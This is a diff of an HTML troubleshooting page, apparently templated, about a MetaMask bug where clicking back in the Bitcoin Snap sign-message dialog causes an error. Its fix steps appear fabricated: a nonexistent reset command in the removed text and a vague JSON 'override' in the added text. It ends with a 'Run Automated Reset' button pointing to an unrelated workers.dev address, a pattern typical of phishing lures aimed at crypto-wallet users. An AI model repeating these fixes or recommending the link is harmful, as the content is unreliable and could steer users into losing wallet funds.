@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Sign Message Clicking Back Button In The – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #1a1a24;
+        font-family: -apple-system;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -42,30 +42,34 @@
 <h1>Metamask Extension Bug Sign Message Clicking Back Button In The</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a bug when using the Metamask extension to sign a message, specifically when clicking the back button in the Bitcoin Snap Sign Message confirmation dialog. The error prevents the user from successfully signing the message, resulting in a frustrating experience.</li>
+<li>When using the Metamask extension to sign a message, clicking the back button in the Bitcoin Snap Sign Message confirmation window results in an error, and the signing process is disrupted.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The bug is caused by a conflict between the Metamask extension's handling of the sign message flow and the Bitcoin Snap's confirmation dialog. When the user clicks the back button, the Metamask extension fails to properly handle the cancellation of the sign message request, leading to the error.</li>
+<li>The error occurs due to a bug in the Metamask extension that fails to properly handle the back button click event in the Sign Message confirmation window, leading to a disruption in the signing process.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Check the Metamask extension version and update to the latest version if necessary</li>
-<li>Clear the browser cache and restart the browser</li>
-<li>Use the following command to reset the Metamask extension's sign message flow:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Check the Metamask extension version and update to the latest version if necessary.</li>
+<li>Clear the browser cache and restart the browser.</li>
+<li>Use the following JSON configuration to override the default Sign Message behavior:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-reset-sign-message-flow<span class="w"> </span>--ethereum-network<span class="w"> </span>mainnet
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;signMessage&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;handleBackButton&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for a more seamless troubleshooting experience.</p>
+<p>Consider utilizing an external console for further debugging and configuration. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Ethereum network (mainnet) selected</li>
-<li>Bitcoin Snap Sign Message confirmation dialog enabled</li>
+<li>Latest version of the browser</li>
+<li>Basic understanding of JSON configuration files</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
